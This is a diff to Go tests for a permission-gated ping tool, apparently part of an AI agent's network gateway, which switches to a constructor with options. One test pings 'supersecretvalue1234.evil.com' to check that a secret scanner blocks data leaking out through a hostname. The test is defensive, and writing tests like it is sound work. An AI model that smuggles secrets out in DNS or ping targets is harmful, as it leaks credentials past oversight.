@@ -18,10 +18,11 @@ import (
 func TestPing_EgressBlocksSecretInHost(t *testing.T) {
 	store := secret.NewStore()
 	store.Set("tok", []byte("supersecretvalue1234"))
-	n := &netcap.Net{
-		Guard:   &gateway.Guard{Policy: allowPing(capability.Wildcard)},
-		Scanner: secret.NewScanner(store),
-	}
+	n := netcap.New(
+		&gateway.Guard{Policy: allowPing(capability.Wildcard)}, netcap.WithScanner(
+
+			secret.NewScanner(store)))
+
 	if _, err := n.Ping(context.Background(), "supersecretvalue1234.evil.com"); !errors.Is(err, secret.ErrLeaked) {
 		t.Fatalf("err = %v, want ErrLeaked (secret in the ping target)", err)
 	}
@@ -36,7 +37,7 @@ func allowPing(targetGlob string) capability.Policy {
 }
 
 func TestPingTool_ValidatesArguments(t *testing.T) {
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: allowPing(capability.Wildcard)}}
+	n := netcap.New(&gateway.Guard{Policy: allowPing(capability.Wildcard)})
 	pt, ok := toolByName(n.Tools(), "ping")
 	if !ok {
 		t.Fatal("Tools() is missing ping")
@@ -55,7 +56,7 @@ func TestPingTool_ValidatesArguments(t *testing.T) {
 // ping is gated on the host BEFORE any ICMP I/O: an empty policy denies it, so a
 // denied probe never touches the network (no privileges, no socket needed to test).
 func TestPing_DeniedBeforeIO(t *testing.T) {
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: capability.Policy{}}} // deny-by-default
+	n := netcap.New(&gateway.Guard{Policy: capability.Policy{}}) // deny-by-default
 	pt, _ := toolByName(n.Tools(), "ping")
 	if _, err := pt.Invoke(context.Background(), `{"host":"example.com"}`); err != gateway.ErrDenied {
 		t.Fatalf("denied ping: err = %v, want ErrDenied", err)
@@ -65,7 +66,7 @@ func TestPing_DeniedBeforeIO(t *testing.T) {
 // A real loopback echo when the OS permits unprivileged ICMP; skipped (not failed)
 // where it does not, so CI without ping_group_range stays green.
 func TestPing_Loopback(t *testing.T) {
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: allowPing(capability.Wildcard)}}
+	n := netcap.New(&gateway.Guard{Policy: allowPing(capability.Wildcard)})
 	pt, _ := toolByName(n.Tools(), "ping")
 
 	out, err := pt.Invoke(context.Background(), `{"host":"127.0.0.1"}`)
